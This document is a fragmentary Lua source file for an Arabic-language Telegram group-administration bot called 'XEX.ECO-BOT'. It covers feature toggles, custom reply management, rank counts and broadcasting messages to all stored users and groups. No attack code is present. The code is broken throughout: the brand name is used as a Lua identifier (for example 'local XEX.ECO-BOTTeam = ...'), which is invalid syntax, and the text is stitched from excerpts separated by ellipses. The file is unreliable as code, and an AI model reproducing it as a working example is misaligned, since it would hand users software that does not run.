ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(XEX.ECO-BOT..'ALS:Lock:AllRed'..msg.chat_id_,true)
end
--     Source XEX.ECO-BOT     --
if ALSSudo(msg) then
...
--     Source XEX.ECO-BOT     --
if msg.content_.photo_ then
if DevALS:get(XEX.ECO-BOT..'ALS:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_) then
if msg.content_.photo_.sizes_[3] then
...
DevALS:del(XEX.ECO-BOT..'ALS:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
return false  end
if data.message_ == "CHAT_ADMIN_REQUIRED" then 
send(msg.chat_id_, msg.id_,"☆︙ليست لدي صلاحية تغير معلومات المجموعه يرجى التحقق من الصلاحيات") 
DevALS:del(XEX.ECO-BOT..'ALS:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_)
...
DevALS:set(XEX.ECO-BOT..'ALS:SetPhoto'..msg.chat_id_..':'..msg.sender_user_id_,true)
end
--     Source XEX.ECO-BOT     --
...
if data.ID == "Ok" then
DevALS:del(XEX.ECO-BOT..'ALS:PinnedMsg'..msg.chat_id_)
...
local PinId = DevALS:get(XEX.ECO-BOT..'ALS:PinnedMsg'..msg.chat_id_)
if PinId then
...
DevALS:del(XEX.ECO-BOT..'ALS:Ban:'..msg.chat_id_)
else
local x = 0
...
local Muted = DevALS:scard(XEX.ECO-BOT.."ALS:Muted:"..msg.chat_id_) or "0"
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
tdcli_function({ID="GetChannelFull",channel_id_ = msg.chat_id_:gsub("-100","")},function(arg,data) 
...
local ConstructorList = DevALS:scard(XEX.ECO-BOT.."ALS:Constructor:"..ChatId) or 0
local BanedList = DevALS:scard(XEX.ECO-BOT.."ALS:Ban:"..ChatId) or 0
local ManagerList = DevALS:scard(XEX.ECO-BOT.."ALS:Managers:"..ChatId) or 0
local MutedList = DevALS:scard(XEX.ECO-BOT.."ALS:Muted:"..ChatId) or 0
local TkeedList = DevALS:scard(XEX.ECO-BOT.."ALS:ALS:Tkeed:"..ChatId) or 0
local AdminsList = DevALS:scard(XEX.ECO-BOT.."ALS:Admins:"..ChatId) or 0
local VipList = DevALS:scard(XEX.ECO-BOT.."ALS:VipMem:"..ChatId) or 0
...
DevALS:set(XEX.ECO-BOT..'ALS:Num:Add:Bot',Num) 
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(XEX.ECO-BOT..'ALS:Lock:FreeBot'..XEX.ECO-BOT) 
end 
end
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(XEX.ECO-BOT..'ALS:Lock:FreeBot'..XEX.ECO-BOT,true) 
end 
end
if ChatType == 'sp' or ChatType == 'gp'  then
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(XEX.ECO-BOT..'ALS:Photo:Profile'..msg.chat_id_) 
end
if text == 'تفعيل صورتي' and Manager(msg) and ChCheck(msg) then  
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل صورتي بنجاح'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(XEX.ECO-BOT..'ALS:Photo:Profile'..msg.chat_id_,true)  
end
if text == 'تفعيل الالعاب' and Manager(msg) and ChCheck(msg) or text == 'تفعيل اللعبه' and Manager(msg) and ChCheck(msg) then   
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل الالعاب بنجاح'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(XEX.ECO-BOT..'ALS:Lock:Games'..msg.chat_id_) 
end
if text == 'تعطيل الالعاب' and Manager(msg) and ChCheck(msg) or text == 'تعطيل اللعبه' and Manager(msg) and ChCheck(msg) then  
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل الالعاب بنجاح'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(XEX.ECO-BOT..'ALS:Lock:Games'..msg.chat_id_,true)  
end
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(XEX.ECO-BOT..'ALS:Lock:Gamesinline'..msg.chat_id_) 
end
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(XEX.ECO-BOT..'ALS:Lock:Gamesinline'..msg.chat_id_,true)  
end
if text == "تفعيل الرابط" and ChCheck(msg) or text == "تفعيل جلب الرابط" and ChCheck(msg) then 
if Admin(msg) then
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل جلب رابط المجموعه'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(XEX.ECO-BOT.."ALS:Lock:GpLinks"..msg.chat_id_)
return false  
end
end
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(XEX.ECO-BOT.."ALS:Lock:GpLinks"..msg.chat_id_,"ok")
return false  
end
end
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(XEX.ECO-BOT.."ALS:Lock:GpLinksinline"..msg.chat_id_,"ok")
return false  
end
end
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(XEX.ECO-BOT.."ALS:Lock:GpLinksinline"..msg.chat_id_)
return false  
end
end
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(XEX.ECO-BOT.."ALS:Lock:GpRd"..msg.chat_id_)
return false  
end
end
...
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(XEX.ECO-BOT.."ALS:Lock:GpRd"..msg.chat_id_,true)
return false  
end
end
...
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تفعيل اضف رد'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:del(XEX.ECO-BOT.."ALS:Lock:Rd"..msg.chat_id_)
return false  
end
end
...
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم تعطيل اضف رد'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
DevALS:set(XEX.ECO-BOT.."ALS:Lock:Rd"..msg.chat_id_,true)
return false  
end
end
--     Source XEX.ECO-BOT     --
...
Text = "☆︙تم تفعيل المجموعه "..dp.title_
local inline = {{{text="‹ ترتيب الاوامر ›",callback_data="/SetCmdGp:"..msg.sender_user_id_},{text="‹ رفع الادمنيه ›",callback_data="/UploadAdmin:"..msg.sender_user_id_}},{{text="‹ غادر ›",callback_data="/LeaveBot:"..msg.sender_user_id_},{text="‹ تعطيل ›",callback_data="/Stop:"..msg.sender_user_id_}},{{text="‹ TeAm XEX.ECO-BOT ›",url="t.me/AAAVAA"}}}
SendInline(msg.chat_id_,Text,nil,inline,msg.id_/2097152/0.5)
DevALS:sadd(XEX.ECO-BOT.."ALS:Groups",msg.chat_id_)
if not DevALS:get(XEX.ECO-BOT..'ALS:SudosGp'..msg.sender_user_id_..msg.chat_id_) and not SecondSudo(msg) then 
DevALS:incrby(XEX.ECO-BOT..'ALS:Sudos'..msg.sender_user_id_,1)
DevALS:set(XEX.ECO-BOT..'ALS:SudosGp'..msg.sender_user_id_..msg.chat_id_,"ALS")
end
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
local Name1 = Name1:gsub("'","") 
...
tdcli_function ({ID = "GetUser",user_id_ = msg.sender_user_id_},function(extra,result,success)
tdcli_function({ID ="GetChat",chat_id_=msg.chat_id_},function(arg,dp) 
if not DevALS:sismember(XEX.ECO-BOT..'ALS:Groups',msg.chat_id_) then
Dev_ALS(msg.chat_id_, msg.id_, 1, '☆︙المجموعه بالتاكيد معطله', 1, 'md')
else
Text = "☆︙تم تعطيل المجموعه "..dp.title_
local inline = {{{text="‹ غادر ›",callback_data="/LeaveBot:"..msg.sender_user_id_},{text="‹ تفعيل ›",callback_data="/On:"..msg.sender_user_id_}},{{text="‹ TeAm XEX.ECO-BOT ›",url="t.me/AAAVAA"}}}
SendInline(msg.chat_id_,Text,nil,inline,msg.id_/2097152/0.5)
DevALS:srem(XEX.ECO-BOT.."ALS:Groups",msg.chat_id_)
local Name1 = result.first_name_
local Name1 = Name1:gsub('"',"") 
...
local Text = "☆︙Source XEX.ECO-BOT\n☆︙File Bot Groups\n┉ ┉ ┉ xᴇx┉ ┉ ┉ ┉\n"
for k,v in pairs(List) do
local GroupsManagers = DevALS:scard(XEX.ECO-BOT.."ALS:Managers:"..v) or 0
local GroupsAdmins = DevALS:scard(XEX.ECO-BOT.."ALS:Admins:"..v) or 0
local Groupslink = DevALS:get(XEX.ECO-BOT.."ALS:Groups:Links" ..v)
...
DevALS:setex(XEX.ECO-BOT.."ALS:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n☆︙للخروج ارسل ↫ ( الغاء ) \n ✓'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevALS:get(XEX.ECO-BOT.."ALS:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevALS:del(XEX.ECO-BOT.."ALS:Send:Pv"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
List = DevALS:smembers(XEX.ECO-BOT..'ALS:Users') 
if msg.content_.text_ then
for k,v in pairs(List) do 
ALSText = "الرساله"
...
DevALS:setex(XEX.ECO-BOT.."ALS:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n☆︙للخروج ارسل ↫ ( الغاء ) \n ✓'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevALS:get(XEX.ECO-BOT.."ALS:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevALS:del(XEX.ECO-BOT.."ALS:Send:Gp"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
List = DevALS:smembers(XEX.ECO-BOT..'ALS:Groups') 
if msg.content_.text_ then
for k,v in pairs(List) do 
ALSText = "الرساله"
send(v, 0,"["..msg.content_.text_.."]") 
...
DevALS:setex(XEX.ECO-BOT.."ALS:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙ارسل الرساله الان لتوجيها \n☆︙للخروج ارسل ↫ ( الغاء ) \n ✓'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevALS:get(XEX.ECO-BOT.."ALS:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevALS:del(XEX.ECO-BOT.."ALS:Send:FwdGp"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false  
end 
local List = DevALS:smembers(XEX.ECO-BOT..'ALS:Groups')   
for k,v in pairs(List) do  
...
DevALS:setex(XEX.ECO-BOT.."ALS:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙ارسل الرساله الان لتوجيها \n☆︙للخروج ارسل ↫ ( الغاء ) \n ✓'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevALS:get(XEX.ECO-BOT.."ALS:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == 'الغاء' then   
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevALS:del(XEX.ECO-BOT.."ALS:Send:FwdPv"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false  
end 
local List = DevALS:smembers(XEX.ECO-BOT..'ALS:Users')   
for k,v in pairs(List) do  
tdcli_function({ID="ForwardMessages", chat_id_ = v, from_chat_id_ = msg.chat_id_, message_ids_ = {[0] = msg.id_}, disable_notification_ = 0, from_background_ = 1},function(a,t) end,nil) 
end   
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم اذاعة رسالتك بالتوجيه \n☆︙‏الى ↫ ❨ "..#List.." ❩ مشترك \n ✓", 1, 'md')
...
DevALS:setex(XEX.ECO-BOT.."ALS:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_, 600, true) 
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙ارسل لي سواء ↫ ⤈ \n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n☆︙للخروج ارسل ↫ ( الغاء ) \n ✓'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
return false
end 
if DevALS:get(XEX.ECO-BOT.."ALS:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) then 
if text == "الغاء" then   
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم الغاء امر الاذاعه بنجاح", 1, 'md')
DevALS:del(XEX.ECO-BOT.."ALS:Send:Gp:Pin"..msg.chat_id_..":" .. msg.sender_user_id_) 
return false
end 
local List = DevALS:smembers(XEX.ECO-BOT.."ALS:Groups") 
if msg.content_.text_ then
...
ALSText = "الرساله"
send(v, 0,"["..msg.content_.text_.."]") 
DevALS:set(XEX.ECO-BOT..'ALS:PinnedMsgs'..v,msg.content_.text_) 
end
elseif msg.content_.photo_ then
if msg.content_.photo_.sizes_[0] then
photo = msg.content_.photo_.sizes_[0].photo_.persistent_id_
...
ALSText = "الصوره"
sendPhoto(v, 0, 0, 1, nil, photo,(msg.content_.caption_ or ''))
DevALS:set(XEX.ECO-BOT..'ALS:PinnedMsgs'..v,photo) 
end 
elseif msg.content_.animation_ then
for k,v in pairs(List) do 
ALSText = "المتحركه"
sendDocument(v, 0, 0, 1,nil, msg.content_.animation_.animation_.persistent_id_,(msg.content_.caption_ or ''))    
DevALS:set(XEX.ECO-BOT..'ALS:PinnedMsgs'..v,msg.content_.animation_.animation_.persistent_id_)
end 
elseif msg.content_.video_ then
for k,v in pairs(List) do 
ALSText = "الفيديو"
sendVideo(v, 0, 0, 1, nil, msg.content_.video_.video_.persistent_id_,(msg.content_.caption_ or '')) 
DevALS:set(XEX.ECO-BOT..'ALS:PinnedMsgs'..v,msg.content_.video_.video_.persistent_id_)
end 
elseif msg.content_.voice_ then
for k,v in pairs(List) do 
ALSText = "البصمه"
sendVoice(v, 0, 0, 1, nil, msg.content_.voice_.voice_.persistent_id_,(msg.content_.caption_ or '')) 
DevALS:set(XEX.ECO-BOT..'ALS:PinnedMsgs'..v,msg.content_.voice_.voice_.persistent_id_)
end 
elseif msg.content_.audio_ then
for k,v in pairs(List) do 
ALSText = "الصوت"
sendAudio(v, 0, 0, 1, nil, msg.content_.audio_.audio_.persistent_id_,(msg.content_.caption_ or '')) 
DevALS:set(XEX.ECO-BOT..'ALS:PinnedMsgs'..v,msg.content_.audio_.audio_.persistent_id_)
end 
elseif msg.content_.document_ then
for k,v in pairs(List) do 
ALSText = "الملف"
sendDocument(v, 0, 0, 1,nil, msg.content_.document_.document_.persistent_id_,(msg.content_.caption_ or ''))    
DevALS:set(XEX.ECO-BOT..'ALS:PinnedMsgs'..v,msg.content_.document_.document_.persistent_id_)
end 
elseif msg.content_.sticker_ then
for k,v in pairs(List) do 
ALSText = "الملصق"
sendSticker(v, 0, 0, 1, nil, msg.content_.sticker_.sticker_.persistent_id_)   
DevALS:set(XEX.ECO-BOT..'ALS:PinnedMsgs'..v,msg.content_.sticker_.sticker_.persistent_id_) 
end 
end
...
if not Bot(msg) and DevALS:get(XEX.ECO-BOT..'ALS:Lock:Rd'..msg.chat_id_) then 
...
local List = DevALS:smembers(XEX.ECO-BOT..'ALS:Manager:GpRedod'..msg.chat_id_)
if #List == 0 then
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙لا توجد ردود متعدده مضافه" ,  1, "md")
return false
end end
DevALS:set(XEX.ECO-BOT..'ALS:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedRedod')
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙حسنا ارسل كلمة الرد اولا" ,  1, "md")
return false
end
if text and text:match("^(.*)$") then
local DelGpRedRedod = DevALS:get(XEX.ECO-BOT..'ALS:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
...
if not DevALS:sismember(XEX.ECO-BOT..'ALS:Manager:GpRedod'..msg.chat_id_,text) then
...
DevALS:set(XEX.ECO-BOT..'ALS:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedRedods')
DevALS:set(XEX.ECO-BOT..'ALS:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_,text)
return false
end end
...
DevALS:set(XEX.ECO-BOT..'ALS:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'DelGpRedod')
...
DevALS:set(XEX.ECO-BOT..'ALS:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'SetGpRedod')
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙حسنا ارسل الكلمه الان" ,  1, "md")
return false
end end
if text and text:match("^(.*)$") then
local SetGpRedod = DevALS:get(XEX.ECO-BOT..'ALS:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_)
...
DevALS:set(XEX.ECO-BOT..'ALS:Add:GpRedod'..msg.sender_user_id_..msg.chat_id_,'SaveGpRedod')
DevALS:set(XEX.ECO-BOT..'ALS:Add:GpTexts'..msg.sender_user_id_..msg.chat_id_,text)
DevALS:sadd(XEX.ECO-BOT..'ALS:Manager:GpRedod'..msg.chat_id_,text)
return false
end end
--     Source XEX.ECO-BOT     --
if text == 'اضف كت' and ChCheck(msg) then
DevALS:set(XEX.ECO-BOT..'ALS:Add:Kt'..msg.sender_user_id_..msg.chat_id_,'SetKt')
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙حسنا ارسل امر `كت تويت` الان" ,  1, "md")
return false
end
if text and text:match("^(.*)$") then
local SetKt = DevALS:get(XEX.ECO-BOT..'ALS:Add:Kt'..msg.sender_user_id_..msg.chat_id_)
if SetKt == 'SetKt' then
if text == "الغاء" then 
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم الغاء الامر" ,  1, "md")
DevALS:del(XEX.ECO-BOT..'ALS:Add:Kt'..msg.sender_user_id_..msg.chat_id_)
...
DevALS:set(XEX.ECO-BOT..'ALS:Add:Kt'..msg.sender_user_id_..msg.chat_id_,'SaveKt')
DevALS:set(XEX.ECO-BOT..'ALS:Add:KtTexts'..msg.sender_user_id_..msg.chat_id_,text)
DevALS:sadd(XEX.ECO-BOT..'ALS:Sudo:Kt'..msg.chat_id_,text)
return false
end end
--     Source XEX.ECO-BOT     --
...
DevALS:set(XEX.ECO-BOT..'ALS:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'DelGpRed')
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙حسنا ارسل الكلمه لحذفها " ,  1, "md")
return false
end
...
DevALS:set(XEX.ECO-BOT..'ALS:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'SetGpRed')
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙حسنا ارسل الكلمه الان " ,  1, "md")
return false
end end
if text and text:match("^(.*)$") then
local SetGpRed = DevALS:get(XEX.ECO-BOT..'ALS:Add:GpRed'..msg.sender_user_id_..msg.chat_id_)
...
DevALS:set(XEX.ECO-BOT..'ALS:Add:GpRed'..msg.sender_user_id_..msg.chat_id_,'SaveGpRed')
DevALS:set(XEX.ECO-BOT..'ALS:Add:GpText'..msg.sender_user_id_..msg.chat_id_,text)
DevALS:sadd(XEX.ECO-BOT..'ALS:Manager:GpRed'..msg.chat_id_,text)
DevALS:set(XEX.ECO-BOT..'DelManagerRep'..msg.chat_id_,text)
keyboard = {} 
...
DevALS:set(XEX.ECO-BOT.."ALS:Add:AllRed"..msg.sender_user_id_,'DelAllRed')
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙حسنا ارسل الكلمه لحذفها " ,  1, "md")
return false
end
...
DevALS:set(XEX.ECO-BOT.."ALS:Add:AllRed"..msg.sender_user_id_,'SetAllRed')
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙حسنا ارسل الكلمه الان " ,  1, "md")
return false
end end
if text and text:match("^(.*)$") then
local SetAllRed = DevALS:get(XEX.ECO-BOT.."ALS:Add:AllRed"..msg.sender_user_id_)
...
Text = "☆︙ارسل لي الرد سواء كان ↫ ⤈\n❨ ملف • ملصق • متحركه • صوره\n • فيديو • بصمه • صوت • رساله ❩\n☆︙يمكنك اضافة الى النص ↫ ⤈\n┉ ┉ ┉ xᴇx┉ ┉ ┉ ┉\n `#username` ↬ معرف المستخدم\n `#msgs` ↬ عدد الرسائل\n `#name` ↬ اسم المستخدم\n `#id` ↬ ايدي المستخدم\n `#stast` ↬ رتبة المستخدم\n `#edit` ↬ عدد السحكات\n┉ ┉ ┉ xᴇx┉ ┉ ┉ ┉\n☆︙للخروج ارسل ↫ ( الغاء )\n ✓"
DevALS:set(XEX.ECO-BOT.."ALS:Add:AllRed"..msg.sender_user_id_,'SaveAllRed')
DevALS:set(XEX.ECO-BOT.."ALS:Add:AllText"..msg.sender_user_id_, text)
DevALS:sadd(XEX.ECO-BOT.."ALS:Sudo:AllRed",text)
DevALS:set(XEX.ECO-BOT.."DelSudoRep",text)
keyboard = {} 
...
local redod = DevALS:smembers(XEX.ECO-BOT..'ALS:Manager:GpRedod'..msg.chat_id_)
MsgRep = '☆︙قائمة الردود المتعدده ↫ ⤈ \n┉ ┉ ┉ xᴇx┉ ┉ ┉ ┉\n'
for k,v in pairs(redod) do
MsgRep = MsgRep..k..'~ (`'..v..'`) • {*العدد ↫ '..#DevALS:smembers(XEX.ECO-BOT..'ALS:Text:GpTexts'..v..msg.chat_id_)..'*}\n' 
end
if #redod == 0 then
...
if not Bot(msg) and DevALS:get(XEX.ECO-BOT..'ALS:Lock:GpRd'..msg.chat_id_) then 
...
for k,v in pairs(redod) do
DevALS:del(XEX.ECO-BOT..'ALS:Text:GpTexts'..v..msg.chat_id_)
DevALS:del(XEX.ECO-BOT..'ALS:Manager:GpRedod'..msg.chat_id_)
end
...
local redod = DevALS:smembers(XEX.ECO-BOT..'ALS:Manager:GpRed'..msg.chat_id_)
MsgRep = '☆︙ردود المدير ↫ ⤈ \n┉ ┉ ┉ xᴇx┉ ┉ ┉ ┉\n'
for k,v in pairs(redod) do
if DevALS:get(XEX.ECO-BOT.."ALS:Gif:GpRed"..v..msg.chat_id_) then
dp = 'متحركه 🎭'
elseif DevALS:get(XEX.ECO-BOT.."ALS:Voice:GpRed"..v..msg.chat_id_) then
dp = 'بصمه 🎙'
elseif DevALS:get(XEX.ECO-BOT.."ALS:Stecker:GpRed"..v..msg.chat_id_) then
dp = 'ملصق 🃏'
elseif DevALS:get(XEX.ECO-BOT.."ALS:Text:GpRed"..v..msg.chat_id_) then
dp = 'رساله ✉'
elseif DevALS:get(XEX.ECO-BOT.."ALS:Photo:GpRed"..v..msg.chat_id_) then
dp = 'صوره 🎇'
elseif DevALS:get(XEX.ECO-BOT.."ALS:Video:GpRed"..v..msg.chat_id_) then
dp = 'فيديو 📽'
elseif DevALS:get(XEX.ECO-BOT.."ALS:File:GpRed"..v..msg.chat_id_) then
dp = 'ملف 📁'
elseif DevALS:get(XEX.ECO-BOT.."ALS:Audio:GpRed"..v..msg.chat_id_) then
dp = 'اغنيه 🎶'
end
...
for k,v in pairs(redod) do
DevALS:del(XEX.ECO-BOT..'ALS:Gif:GpRed'..v..msg.chat_id_)
DevALS:del(XEX.ECO-BOT..'ALS:Voice:GpRed'..v..msg.chat_id_)
DevALS:del(XEX.ECO-BOT..'ALS:Audio:GpRed'..v..msg.chat_id_)
DevALS:del(XEX.ECO-BOT..'ALS:Photo:GpRed'..v..msg.chat_id_)
DevALS:del(XEX.ECO-BOT..'ALS:Stecker:GpRed'..v..msg.chat_id_)
DevALS:del(XEX.ECO-BOT..'ALS:Video:GpRed'..v..msg.chat_id_)
DevALS:del(XEX.ECO-BOT..'ALS:File:GpRed'..v..msg.chat_id_)
DevALS:del(XEX.ECO-BOT..'ALS:Text:GpRed'..v..msg.chat_id_)
DevALS:del(XEX.ECO-BOT..'ALS:Manager:GpRed'..msg.chat_id_)
end
...
MsgRep = '☆︙ردود المطور ↫ ⤈ \n┉ ┉ ┉ xᴇx┉ ┉ ┉ ┉\n'
for k,v in pairs(redod) do
if DevALS:get(XEX.ECO-BOT.."ALS:Gif:AllRed"..v) then
dp = 'متحركه 🎭'
elseif DevALS:get(XEX.ECO-BOT.."ALS:Voice:AllRed"..v) then
dp = 'بصمه 🎙'
elseif DevALS:get(XEX.ECO-BOT.."ALS:Stecker:AllRed"..v) then
dp = 'ملصق 🃏'
elseif DevALS:get(XEX.ECO-BOT.."ALS:Text:AllRed"..v) then
dp = 'رساله ✉'
elseif DevALS:get(XEX.ECO-BOT.."ALS:Photo:AllRed"..v) then
dp = 'صوره 🎇'
elseif DevALS:get(XEX.ECO-BOT.."ALS:Video:AllRed"..v) then
dp = 'فيديو 📽'
elseif DevALS:get(XEX.ECO-BOT.."ALS:File:AllRed"..v) then
dp = 'ملف 📁'
elseif DevALS:get(XEX.ECO-BOT.."ALS:Audio:AllRed"..v) then
dp = 'اغنيه 🎶'
end
MsgRep = MsgRep..k..'~ (`'..v..'`) ↫ {*'..dp..'*}\n' 
end
...
DevALS:set(XEX.ECO-BOT..'ALS:NameBot'..msg.sender_user_id_, 'msg')
return false 
end
end
...
DevALS:del(XEX.ECO-BOT..'ALS:NameBot')
local XEX.ECO-BOTTeam = '☆︙اهلا عزيزي ↫ '..ALSRank(msg)..' \n☆︙تم حذف اسم البوت'
ALSmoned(msg.chat_id_, msg.sender_user_id_, msg.id_, XEX.ECO-BOTTeam, 14, string.len(msg.sender_user_id_))
end end 
--     Source XEX.ECO-BOT     --
...
DevALS:set(XEX.ECO-BOT..'ALS:Help0'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local XEX.ECO-BOTTeam =  DevALS:get(XEX.ECO-BOT..'ALS:Help0'..msg.sender_user_id_)
if XEX.ECO-BOTTeam == 'msg' then
Dev_ALS(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevALS:del(XEX.ECO-BOT..'ALS:Help0'..msg.sender_user_id_)
DevALS:set(XEX.ECO-BOT..'ALS:Help', text)
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
end
...
DevALS:set(XEX.ECO-BOT..'ALS:Help01'..msg.sender_user_id_, 'msg')
return false end
if text and text:match("^(.*)$") then
local XEX.ECO-BOTTeam =  DevALS:get(XEX.ECO-BOT..'ALS:Help01'..msg.sender_user_id_)
if XEX.ECO-BOTTeam == 'msg' then 
Dev_ALS(msg.chat_id_, msg.id_, 1, text , 1, 'md')
DevALS:del(XEX.ECO-BOT..'ALS:Help01'..msg.sender_user_id_)
DevALS:set(XEX.ECO-BOT..'ALS:Help1', text)
Dev_ALS(msg.chat_id_, msg.id_, 1, "☆︙تم حفظ الكليشه الجديده " ,  1, "md")
return false end
